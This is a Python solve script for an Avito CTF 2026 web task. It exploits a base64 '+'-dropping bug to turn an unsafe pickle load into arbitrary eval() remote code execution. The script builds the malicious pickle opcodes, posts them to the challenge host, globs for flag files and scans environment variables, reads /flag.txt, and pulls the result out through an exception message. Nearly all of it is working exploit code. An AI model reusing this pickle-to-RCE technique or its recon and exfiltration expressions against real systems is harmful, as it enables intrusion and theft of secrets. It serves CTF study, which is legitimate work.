#!/usr/bin/env python3
"""
Нагибатор (Avito CTF 2026, task9) — SOLVED LIVE 2026-07-22.

FLAG: avito{nO_diScoUn7_15_NeEded_whEN_Y0U_haVE_rc3}   (read from /flag.txt)

Vulnerability: the frontend pickles the strategy form as a 5-tuple, base64-encodes
it, and forwards it to an internal backend inside an x-www-form-urlencoded body.
There, every '+' becomes a space and base64.b64decode drops it -> a 6-bit shift.
The `pressure` integer is serialized as pickle LONG1 (0x8a <len> <raw LE bytes>);
those bytes are raw (no UTF-8 wall). By making the LONG1 length byte encode to a
base64 '+', dropping it collapses the declared length to 0, and the trailing bytes
of the number are then executed as pickle opcodes -> arbitrary eval() -> RCE.
Exfil rides the backend's broad `except Exception -> {"detail": str(e)}` at
backend.py:204: int() on the flag string raises ValueError carrying the flag.

Only stdlib. Run: ``uv run python task9/solve_nagibator.py``.
"""

import base64
import html as _html
import pickle
import re
import urllib.parse
import urllib.request

HOST = "https://nagibator-tsg8r370.avitoctf.ru/"


# --- exact server transform (Python 3.7 backend), verified byte-for-byte against
#     the live anchor: (30,5,"00:30",["other"],"У меня жалостливый вид") -> byte 0xb4@23
def repad_decode(b64: bytes) -> bytes:
    s = b64.replace(b"+", b"").rstrip(b"=")
    while len(s) % 4:
        s += b"="
    return base64.b64decode(s)


def craft_pressure(expr: str) -> int:
    """Build the 248-byte LONG1 whose length byte is 0xF8 ('+'), collapsing to 0
    after the '+' is dropped, so `expr` runs via builtins.eval.
    """
    opcodes = b"cbuiltins\neval\n(V" + expr.encode() + b"\ntR."
    assert len(opcodes) <= 248, f"payload too long: {len(opcodes)} opcodes"
    data = bytearray(248)
    # inverse of the drop:  out[j] = ((in[j]&3)<<6) | (in[j+1]>>2)   (j>=6)
    data[0] = opcodes[0] >> 6
    for t, o in enumerate(opcodes):
        nxt = opcodes[t + 1] if t + 1 < len(opcodes) else 0
        if t + 1 < 248:
            data[t + 1] = ((o & 0x3F) << 2) | (nxt >> 6)
    data[247] = 0x01  # MSB nonzero & <0x80 -> encode_long emits exactly 248 bytes
    return int.from_bytes(bytes(data), "little")


def good_extras(pressure: int):
    """Cyrillic extras (route to backend) whose base64 has datachars%4 != 1 (decodable)."""
    cands = [
        "я",
        "ого",
        "беда",
        "печаль",
        "грусть",
        "эхма",
        "беда-я",
        "мёд",
        "авб",
        "гдж",
        "клм",
        "ноп",
        "рст",
        "уфх",
        "эй",
        "ыыы",
        "ооо",
    ]
    out = []
    for ex in cands:
        b = base64.b64encode(pickle.dumps((30, pressure, "00:30", ["other"], ex), 2))
        if (len(b) - b.count(b"=") - b.count(b"+")) % 4 == 1:
            continue
        out.append(ex)
    return out


def fire(pressure: int, extra: str) -> str:
    body = "&".join(
        [
            "discount=30",
            "time_amt=00%3A30",
            "trumps=other",
            "extra=" + urllib.parse.quote(extra),
            "pressure=" + str(pressure),
        ]
    )
    req = urllib.request.Request(
        HOST,
        data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        page = urllib.request.urlopen(req, timeout=30).read().decode("utf-8", "replace")
    except Exception as e:
        return f"NET-ERR {e}"
    d = _html.unescape(page)
    flag = re.search(r"avito\{[^}]*\}", d)
    if flag:
        return "FLAG " + flag.group(0)
    v = re.search(r"invalid literal for int\(\) with base 10: [^\"]{0,160}", d)
    if v:
        return "REFLECT " + v.group(0)
    if "Internal Server Error" in d:
        return "GENERIC500"  # decode failed (datachars%4==1) -> binascii outside try
    if "ваша стратегия" in d:
        return "PERSONA"  # routed to a local persona (hash of the 5 fields)
    return "??"


def main():
    # Step 1 (recon): locate the flag file.
    recon = (
        "int(str(__import__('glob').glob('/*flag*')"
        "+__import__('glob').glob('/app/*flag*')"
        "+[k for k in __import__('os').environ if 'FLAG' in k.upper()]))"
    )
    # Step 2 (read): dump it.  Live recon showed ['/flag.txt'].
    read = "int(open('/flag.txt').read())"

    for label, expr in (("READ", read), ("RECON", recon)):
        P = craft_pressure(expr)
        for extra in good_extras(P):
            res = fire(P, extra)
            print(f"[{label}] extra={extra!r:10} -> {res}")
            if res.startswith("FLAG"):
                print("\n" + res)
                return
            if label == "READ" and res.startswith("REFLECT"):
                print("\n" + res)
                return
        print()


if __name__ == "__main__":
    main()
